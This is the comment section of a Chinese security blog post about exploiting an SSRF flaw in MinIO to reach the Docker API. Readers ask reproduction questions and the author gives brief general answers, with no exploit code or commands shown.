                    <a href="" target="_blank" rel="nofollow noopener">Jerrytq</a>
                    <time datetime="2021年11月21日 16:16" itemprop="datePublished">
                      2021 十一月 21 16:16
                    </time>
                    <a href="javascript:reply_to('3717', 'Jerrytq')">回复</a>
                  </p>
                  <p class="comment-meta">想请教大佬，我按照您的步骤，到使用307跳转那一步，但是nc接受到的仍然是get请求，有遇到这种情况么？</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3721">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
                    <time datetime="2021年11月21日 21:55" itemprop="datePublished">
                      2021 十一月 21 21:55
                    </time>
                    <a href="javascript:reply_to('3721', 'phithon')">回复</a>
                  </p>
                  <p class="comment-meta">@Jerrytq 没有遇到过，你再检查一下自己的操作过程吧。</p>
                </div>
              </div>
              
            </div>
                
              
            
              <div class="flex mb-2" id="comment-3670">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">hellman</a>
                    <time datetime="2021年7月17日 06:25" itemprop="datePublished">
                      2021 七月 17 06:25
                    </time>
                    <a href="javascript:reply_to('3670', 'hellman')">回复</a>
                  </p>
                  <p class="comment-meta">哎，什么时候能达到P牛16年的水平呢？</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-3645">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/c685b78d618413e46c3ac3feb96653f9.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">站元素主机</a>
                    <time datetime="2021年4月15日 11:32" itemprop="datePublished">
                      2021 四月 15 11:32
                    </time>
                    <a href="javascript:reply_to('3645', '%E7%AB%99%E5%85%83%E7%B4%A0%E4%B8%BB%E6%9C%BA')">回复</a>
                  </p>
                  <p class="comment-meta">感谢分享 赞一个</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-3630">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">York</a>
                    <time datetime="2021年3月2日 14:50" itemprop="datePublished">
                      2021 三月 02 14:50
                    </time>
                    <a href="javascript:reply_to('3630', 'York')">回复</a>
                  </p>
                  <p class="comment-meta">想请教一下，如果内网没有docker集群，这个漏洞该如何利用？至少扫端口该怎么扫？没有任何回显，不知道该怎么操作了。。</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3638">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
                    <time datetime="2021年3月25日 18:21" itemprop="datePublished">
                      2021 三月 25 18:21
                    </time>
                    <a href="javascript:reply_to('3638', 'phithon')">回复</a>
                  </p>
                  <p class="comment-meta">@York 有XSS盲打的经验吗，Payload填进去点提交，能不能收到结果全凭运气。</p>
                </div>
              </div>
              
            </div>
                
              
            
              <div class="flex mb-2" id="comment-3611">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/19c96850924bf4bc9b6b976708c9e493.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">OuO</a>
                    <time datetime="2021年2月5日 14:52" itemprop="datePublished">
                      2021 二月 05 14:52
                    </time>
                    <a href="javascript:reply_to('3611', 'OuO')">回复</a>
                  </p>
                  <p class="comment-meta">p师傅，容器为什么能访问到docker的API啊，我复现这个失败了，MinIO报错无法访问docker API，connect: no route to host</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3612">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">OuO</a>
                    <time datetime="2021年2月5日 15:27" itemprop="datePublished">
                      2021 二月 05 15:27
                    </time>
                    <a href="javascript:reply_to('3612', 'OuO')">回复</a>
                  </p>
                  <p class="comment-meta">@OuO 防火墙忘记关了打扰了- -</p>
                </div>
              </div>
              
            </div>
                
              
            
              <div class="flex mb-2" id="comment-3608">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">路过</a>
                    <time datetime="2021年2月3日 10:52" itemprop="datePublished">
                      2021 二月 03 10:52
                    </time>
                    <a href="javascript:reply_to('3608', '%E8%B7%AF%E8%BF%87')">回复</a>
                  </p>
                  <p class="comment-meta">还是比较鸡肋的。</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3609">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
                    <time datetime="2021年2月3日 15:24" itemprop="datePublished">
                      2021 二月 03 15:24
                    </time>
                    <a href="javascript:reply_to('3609', 'phithon')">回复</a>
                  </p>
                  <p class="comment-meta">@路过 长期致力于鸡肋漏洞的回收再利用</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3634">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">sqx</a>
                    <time datetime="2021年3月25日 10:36" itemprop="datePublished">
                      2021 三月 25 10:36
                    </time>
                    <a href="javascript:reply_to('3634', 'sqx')">回复</a>
                  </p>
                  <p class="comment-meta">@phithon @York 如果内网没有docker集群，这个漏洞该如何利用</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3637">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
                    <time datetime="2021年3月25日 18:19" itemprop="datePublished">
                      2021 三月 25 18:19
                    </time>
                    <a href="javascript:reply_to('3637', 'phithon')">回复</a>
                  </p>
                  <p class="comment-meta">@sqx 不是所有漏洞都可以利用。比如你扫到一个SQL注入漏洞，但是裤子里啥也没有，也无法getshell，也只能另寻他法。</p>
                </div>
              </div>
              
                
                  
              <div class="flex mb-2" id="comment-3640">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">sqx</a>
                    <time datetime="2021年3月27日 18:10" itemprop="datePublished">
                      2021 三月 27 18:10
                    </time>
                    <a href="javascript:reply_to('3640', 'sqx')">回复</a>
                  </p>
                  <p class="comment-meta">@phithon 感谢指点🙇‍</p>
                </div>
              </div>
              
            
                
              
            </div>
                
              
            </div>
                
              
            </div>
                
              
            
              <div class="flex mb-2" id="comment-3607">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">guillermo_best_6@hotmail.com</a>
                    <time datetime="2021年2月3日 00:14" itemprop="datePublished">
                      2021 二月 03 00:14
                    </time>
                    <a href="javascript:reply_to('3607', 'guillermo_best_6%40hotmail.com')">回复</a>
                  </p>
                  <p class="comment-meta">嘿!恭喜您的报告。我想知道端口2375是否已关闭，如何利用SSRF至少实现内部端口扫描或AWS机密泄露。<br><br>非常感谢</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-3606">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://annevi.cn" target="_blank" rel="nofollow noopener">Annevi</a>
                    <time datetime="2021年2月2日 10:14" itemprop="datePublished">
                      2021 二月 02 10:14
                    </time>
                    <a href="javascript:reply_to('3606', 'Annevi')">回复</a>
                  </p>
                  <p class="comment-meta">学习了</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-3605">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/5aa864692767e0d284fc73adc5c9f83d.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="http://068089dy.github.io" target="_blank" rel="nofollow noopener">068089dy</a>
                    <time datetime="2021年2月2日 09:27" itemprop="datePublished">
                      2021 二月 02 09:27
                    </time>
                    <a href="javascript:reply_to('3605', '068089dy')">回复</a>
                  </p>
                  <p class="comment-meta">666牛逼</p>
                </div>
              </div>
              
            
          
        </div>

        

        <form method="post" enctype="multipart/form-data" action="#reply" id="reply" class="mb-4">
          <div class="container-fluid px-0">
            
            <div class="row">
              <div class="col">
                <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
              </div>
            </div>
            <div class="row gx-2">
              <div class="col-4">
                <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
              </div>
              <div class="col-4">
                <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
              </div>
              <div class="col-4">
                <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-4">
              <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="39f94077ac780ee9d8bd8fe93371bb761f2d14ee" />
</div><div class="col-6">
<img src="../captcha/image/39f94077ac780ee9d8bd8fe93371bb761f2d14ee/index.png" alt="captcha" class="captcha" /></div></div>
            </div>
          </div>
          <div class="row">
            <div class="col">
              <input type="submit" class="ui-button ui-button-sgreen" value="提交">
            </div>
          </div>
          <input type="hidden" name="archive" value="460" id="id_archive">
          <input type="hidden" name="parent" id="id_parent">
          <input type="hidden" name="csrfmiddlewaretoken" value="4MYPBmuWsoxIojgzeL17zrCeUUI1azYHQkmG9r5FQKLrWR4XgMYSwUFjfhZcJbaZ">
        </form>
      </div>
    </div>
    <div class="row justify-content-center">
      <div class="col-lg-7 col-md-10 col-sm-12">
        <footer class="footer mx-auto">
  <div class="footer-left">
    Copyright &copy; 2023 Powered by talkbook
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <li><a href="../index.html">首页</a></li>
        <li><a href="../feed/index.rss" target="_blank">RSS订阅</a></li>
        <li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
        <li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
        <li><a href="../index.html">更换模板</a></li>
      </ul>
    </nav>
  </div>
</footer>
      </div>
    </div>
  </div>

<script src="https://cdn.staticfile.org/jquery/2.2.4/jquery.min.js"></script>
<script src="../static/cactus/js/main%EF%B9%96v=2021102502.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

  <script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
  <script>
      $(document).ready(function () {
          $(".content a").each(function (i, e) {
              if (e.host != 'www.leavesongs.com') {
                  e.target = '_blank';
              }
          });
          $(".content img").each(function (i, e) {
              if (e.parentNode.tagName.toUpperCase() != 'A') {
                  $(e).wrap('<a href="' + escapeHtml(e.src) + '" class="fancybox"></a>');
              } else {
                  $(e.parentNode).addClass('fancybox');
              }
          });
          $('.fancybox').fancybox();
      })
  </script>

</body>
</html>